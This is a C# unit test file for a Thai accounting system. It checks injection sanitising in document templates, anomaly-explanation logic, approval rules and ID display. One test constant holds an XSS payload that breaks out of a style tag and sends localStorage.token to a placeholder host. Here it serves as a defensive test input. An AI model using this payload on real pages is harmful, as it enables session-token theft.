using System;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Accounting.Helpers;
using Accounting.Models.Entities;
using Accounting.Models.Enums;
using Accounting.Services.Ai.Distillation;
using Accounting.Services.Ai.Prompts;
using Accounting.Services.Implementations;
using Microsoft.Extensions.Logging.Abstractions;
using Xunit;

namespace Accounting.Tests;

/// <summary>
/// รอบ 200 ทีม RF — แก้ผลฝ่ายค้านของทีม R (<c>erp-review/2026-09-29/review200-R.md</c>) · ทุกกลุ่มมีสองทิศ:
/// ครึ่งแรก = เคสที่เคยพังกลับมาถูก · ครึ่งหลัง = ค่าปกติ/ใบที่ถูกอยู่แล้วไม่ถูกแตะ
/// </summary>
public class TeamRFRound200Tests
{
    // ───────────── R200-X1: ค่าหน้าตาของเทมเพลตที่เข้า <style> ─────────────

    private const string StyleBreak = "x'</style><img src=x onerror=fetch('//x/'+localStorage.token)>";

    [Fact]
    public void X1_สีที่เป็นข้อความโจมตี_ตัวตรวจคืน_null()
    {
        Assert.Null(DocumentTemplateStyle.Hex(StyleBreak));
        Assert.Null(DocumentTemplateStyle.Hex("#4472C4;}</style>"));
        Assert.Null(DocumentTemplateStyle.Hex("red"));
        Assert.Null(DocumentTemplateStyle.Hex("#12345"));
    }

    [Fact]
    public void X1_ฟอนต์นอกรายการ_ขนาดนอกช่วง_ได้ค่าปลอดภัย()
    {
        Assert.Equal(DocumentTemplateStyle.DefaultFont, DocumentTemplateStyle.Font(StyleBreak));
        Assert.Equal(DocumentTemplateStyle.BodyFontDefault, DocumentTemplateStyle.BodyFontSize("14px;}</style>"));
        Assert.Equal(DocumentTemplateStyle.TitleFontMax, DocumentTemplateStyle.TitleFontSize("400"));
        Assert.Equal("A4", DocumentTemplateStyle.PaperSize("A4 portrait; } body { display:none"));
    }

    [Fact]
    public void X1_BuildCss_ค่าโจมตีทุกช่อง_ไม่มีแท็กหลุดออกจาก_style()
    {
        var t = new DocumentTemplate
        {
            FontFamily = StyleBreak, BodyFontSize = StyleBreak, TitleFontSize = StyleBreak,
            PrimaryColor = StyleBreak, AccentColor = StyleBreak, HeaderBackgroundColor = StyleBreak,
            TableHeaderColor = StyleBreak, TableHeaderTextColor = StyleBreak, TableStripedColor = StyleBreak,
            PaperSize = StyleBreak, Orientation = StyleBreak,
        };
        var css = PdfGenerationService.BuildCss(t);
        foreach (var layout in new[] { "Classic", "ModernLeft", "BannerHeader", "BoldHeader", "SplitHeader", "Letterhead", "CenteredFormal", "SidebarAccent" })
            css += PdfGenerationService.BuildLayoutCss(layout, t);
        Assert.DoesNotContain("<", css);
        Assert.DoesNotContain("onerror", css);
        Assert.DoesNotContain("localStorage", css);
    }

    [Fact]
    public void X1_ตอนบันทึก_ค่าไม่ถูกรูปถูกปฏิเสธเป็นภาษาไทย()
    {
        var errs = DocumentTemplateStyle.RejectReasons(new TemplateStyleInput(
            FontFamily: StyleBreak, PrimaryColor: StyleBreak, TitleFontSize: "999", PaperSize: "A3"));
        Assert.Equal(4, errs.Count);
        Assert.All(errs, e => Assert.Matches("[฀-๿]", e));
    }

    // ทิศตรงข้าม — เทมเพลตปกติจากหน้าแก้เทมเพลต (input type=color · select ฟอนต์ · ตัวเลข) ต้องผ่านและหน้าตาเท่าเดิม

    [Fact]
    public void X1_ค่าปกติจากหน้าแก้เทมเพลต_บันทึกผ่าน()
    {
        var errs = DocumentTemplateStyle.RejectReasons(new TemplateStyleInput(
            "A4", "Portrait", "Prompt", "14", "22", "#1f2937", "#4472c4", "#4472C4", "#FFFFFF", "#ffffff", null, ""));
        Assert.Empty(errs);
        Assert.Empty(DocumentTemplateStyle.RejectReasons(new TemplateStyleInput()));   // ไม่ได้ส่งช่องไหน = ไม่แตะ
    }

    [Fact]
    public void X1_BuildCss_เทมเพลตปกติ_สีและขนาดเหมือนเดิม()
    {
        var t = new DocumentTemplate();   // ค่าเริ่มต้นของ entity
        var css = PdfGenerationService.BuildCss(t);
        Assert.Contains("color: #333333", css);
        Assert.Contains("background: #4472C4; color: #FFFFFF", css);
        Assert.Contains("font-family: 'THSarabunNew'", css);
        Assert.Contains("font-size: 14px", css);
        Assert.Contains("size: A4 portrait", css);
    }

    [Fact]
    public void X1_ตัวตรวจสีตัวเดียวกับ_QuestPDF_รับ_RGB_สั้นด้วย()
    {
        Assert.Equal("#FFFFFF", PdfGenerationService.SanitizeHex("#fff"));
        Assert.Equal("#4472C4", PdfGenerationService.SanitizeHex("4472c4"));
        Assert.Equal(DocumentTemplateStyle.Hex(StyleBreak), PdfGenerationService.SanitizeHex(StyleBreak));
    }

    // ───────────── R200-X2 / X8: นักเรียนอธิบายรายการผิดปกติ + kill-switch ─────────────

    private static string PromptJson(object vendorHistory, decimal amount, string? localGuess,
        System.Collections.Generic.IReadOnlyList<decimal>? recent = null)
        => AnomalyExplainPrompt.Build(Guid.NewGuid(), Guid.NewGuid(), "AmountOutlier", "ยอดสูงผิดปกติ",
            vendorHistory, new { }, amount, "{}", localGuess, recentMonthlyTotals: recent).UserPromptJson;

    [Fact]
    public void X2_นักเรียนอ่าน_payload_ของ_prompt_จริงได้()
    {
        var facts = AnomalyExplainStudent.ReadPrompt(PromptJson(
            new { vendor = "ร้าน ก", history = new[] { 1000m, 1100m, 950m, 1050m } }, 120000m, "NeedReview"));
        Assert.NotNull(facts);
        Assert.Equal(120000m, facts!.Amount);
        Assert.Equal(4, facts.Series.Count);
        Assert.Equal("NeedReview", facts.LocalPick);
    }

    [Theory]
    [InlineData(true)]
    [InlineData(false)]
    public async Task X2_KillSwitch_ปิด_provider_นักเรียนยังตอบเป็นค่าในชุดและบันทึกได้(bool withSeries)
    {
        // เส้นที่บันทึกลงรายการ (ExplainAnomaly) ส่งสรุปประวัติ ไม่ใช่ชุดยอด · เส้น ad-hoc ส่งชุดยอด — สองรูปต้องตอบได้ทั้งคู่
        object vh = withSeries
            ? new { vendor = "ร้าน ก", history = new[] { 1000m, 1100m, 950m, 1050m, 1020m } }
            : new { count = 12, avg = 1020m, min = 900m, max = 1200m, median = 1000m };
        var model = new AnomalyExplanationDistillationModel(NullLogger<AnomalyExplanationDistillationModel>.Instance);
        var pred = await model.PredictAsync(Guid.NewGuid(), PromptJson(vh, 250000m, "NeedReview"), CancellationToken.None);

        Assert.NotNull(pred);
        Assert.Contains(pred!.PrimaryAnswer, AnomalyExplainVerdict.Candidates);
        // orchestrator ตอนปิด provider: UsedAi=false · FromLocalModel=true · RawResponseJson = StructuredJson
        Assert.True(AnomalyExplainVerdict.ShouldPersist(usedAi: false, fromLocalModel: true, pred.PrimaryAnswer));
        var text = AnomalyExplainStudent.ReadStructured(pred.StructuredJson);
        Assert.NotNull(text);
        Assert.False(string.IsNullOrWhiteSpace(text!.Value.Reasoning));
        Assert.Equal("LikelyError", pred.PrimaryAnswer);   // 250,000 เทียบประวัติราว 1,000 = ห่างเกินสิบเท่า/ z สูง
    }

    [Fact]
    public async Task X2_ColdStart_ไม่มีประวัติเลย_ยังได้คำตอบ_NeedReview()
    {
        var model = new AnomalyExplanationDistillationModel(NullLogger<AnomalyExplanationDistillationModel>.Instance);
        var pred = await model.PredictAsync(Guid.NewGuid(), PromptJson("", 0m, null), CancellationToken.None);
        Assert.NotNull(pred);
        Assert.Equal("NeedReview", pred!.PrimaryAnswer);
    }

    [Fact]
    public void X2_ทิศตรงข้าม_ยอดอยู่ในช่วงประวัติ_ตอบ_LikelyLegit()
    {
        var facts = AnomalyExplainStudent.ReadPrompt(PromptJson(
            new { count = 12, avg = 1020m, min = 900m, max = 1200m, median = 1000m }, 1100m, "NeedReview"))!;
        Assert.Equal("LikelyLegit", AnomalyExplainStudent.Decide(facts, seriesZ: null).Primary);
        Assert.Equal("LikelyLegit", AnomalyExplainStudent.Decide(facts, seriesZ: 0.4m).Primary);
    }

    [Theory]
    [InlineData("likely_error", "LikelyError")]
    [InlineData("Likely Legit", "LikelyLegit")]
    [InlineData("need-review", "NeedReview")]
    [InlineData("น่าจะผิดพลาด", "NeedReview")]
    [InlineData("Probably fine", "NeedReview")]
    public void X8_คำตอบครูนอกชุด_แปลงเข้าชุดแล้วบันทึก_ไม่ทิ้ง(string teacher, string expected)
    {
        Assert.Equal(expected, AnomalyExplainVerdict.Coerce(teacher));
        Assert.True(AnomalyExplainVerdict.ShouldPersist(usedAi: true, fromLocalModel: false, teacher));
    }

    [Fact]
    public void X8_ทิศตรงข้าม_คำตอบตรงชุดคงเดิม_ไม่มีคำตอบไม่บันทึก()
    {
        Assert.Equal("LikelyLegit", AnomalyExplainVerdict.Coerce("LikelyLegit"));
        Assert.True(AnomalyExplainVerdict.IsRecognized("likely_error"));
        Assert.False(AnomalyExplainVerdict.IsRecognized("Probably fine"));
        Assert.Null(AnomalyExplainVerdict.Coerce("  "));
        Assert.False(AnomalyExplainVerdict.ShouldPersist(usedAi: true, fromLocalModel: false, null));
    }

    // ───────────── R200-X3: แก้กฎอนุมัติ — ไม่มีคีย์ = คงเดิม · "" = ล้าง ─────────────

    [Fact]
    public void X3_ไม่ได้ส่งคำอธิบาย_โครงการ_ต้องคงค่าเดิม()
    {
        var pid = Guid.NewGuid();
        Assert.Equal("เดิม", ApprovalRuleValidation.PatchDescription("เดิม", null));
        Assert.Equal(pid, ApprovalRuleValidation.PatchProjectId(pid, sent: null, clear: false));
    }

    [Fact]
    public void X3_ทิศตรงข้าม_ตั้งใจล้างหรือเปลี่ยน_ต้องมีผล()
    {
        var pid = Guid.NewGuid();
        var other = Guid.NewGuid();
        Assert.Null(ApprovalRuleValidation.PatchDescription("เดิม", ""));
        Assert.Equal("ใหม่", ApprovalRuleValidation.PatchDescription("เดิม", " ใหม่ "));
        Assert.Null(ApprovalRuleValidation.PatchProjectId(pid, sent: null, clear: true));
        Assert.Equal(other, ApprovalRuleValidation.PatchProjectId(pid, sent: other, clear: false));
        Assert.Equal(other, ApprovalRuleValidation.PatchProjectId(pid, sent: other, clear: true));   // ส่งค่า = ไม่ขยายขอบเขต
    }

    // ───────────── R200-X4: ใบกำกับการริบที่ค้าง — ล้างวันรับเงินทุกสถานะที่ยังไม่ออกเลข ─────────────

    [Theory]
    [InlineData(DocumentStatus.Draft)]
    [InlineData(DocumentStatus.WaitingApproval)]
    [InlineData(DocumentStatus.Rejected)]
    public void X4_ยังไม่ออกเลข_ต้องล้างวันรับเงินก่อนอนุมัติ(DocumentStatus status)
        => Assert.True(DepositKindDocumentRules.ShouldClearStalePaymentDate(status, new DateTime(2026, 8, 3)));

    [Theory]
    [InlineData(DocumentStatus.Approved)]
    [InlineData(DocumentStatus.Paid)]
    public void X4_ทิศตรงข้าม_ใบที่ออกเลขแล้ว_หรือไม่มีวันรับเงิน_ไม่แตะ(DocumentStatus status)
    {
        Assert.False(DepositKindDocumentRules.ShouldClearStalePaymentDate(status, new DateTime(2026, 8, 3)));
        Assert.False(DepositKindDocumentRules.ShouldClearStalePaymentDate(DocumentStatus.Draft, null));
    }

    // ───────────── R200-X5: ไม่ใช่เจ้าของ = 403 พร้อมข้อความ (ไม่ใช่ 401 ที่เด้งออกจากระบบ) ─────────────

    [Fact]
    public void X5_ไม่ใช่เจ้าของ_ได้_403_และข้อความไทย()
    {
        var ex = OwnerActionGuard.NotOwner("จัดการบทบาทและสิทธิ์");
        Assert.Equal(403, ex.StatusCode);
        Assert.IsNotType<UnauthorizedAccessException>(ex);
        Assert.Contains("เจ้าของบริษัท", ex.Message);
        Assert.StartsWith("จัดการบทบาทและสิทธิ์", ex.Message);
    }

    // ───────────── R200-X6: เลข ปกส. บนจอ = ตัวตัดสินเดียวกับไฟล์ สปส.1-10 ─────────────

    private const string ValidCitizenId = "1101700230708";

    [Fact]
    public void X6_ช่องเลข_ปกส_ว่าง_จอแสดงเลขบัตรเหมือนไฟล์()
    {
        Assert.Equal(ValidCitizenId, SsoInsuredNumber.Resolve(null, ValidCitizenId).Number);
        Assert.Equal(ValidCitizenId, SsoInsuredNumber.ForDisplay(null, ValidCitizenId, includePii: true));
        Assert.Equal("1-XXXX-XXXXX-XX-8", SsoInsuredNumber.ForDisplay("", ValidCitizenId, includePii: false));
    }

    [Fact]
    public void X6_ทิศตรงข้าม_เลขที่กรอกไว้ชนะ_ไม่มีทั้งคู่ไม่แต่งเลข()
    {
        Assert.Equal("3100600123452", SsoInsuredNumber.ForDisplay("3100600123452", ValidCitizenId, includePii: true));
        Assert.Null(SsoInsuredNumber.ForDisplay(null, "1234567890123", includePii: true));   // checksum ไม่ผ่าน
        Assert.Null(SsoInsuredNumber.ForDisplay(null, null, includePii: false));
    }
}
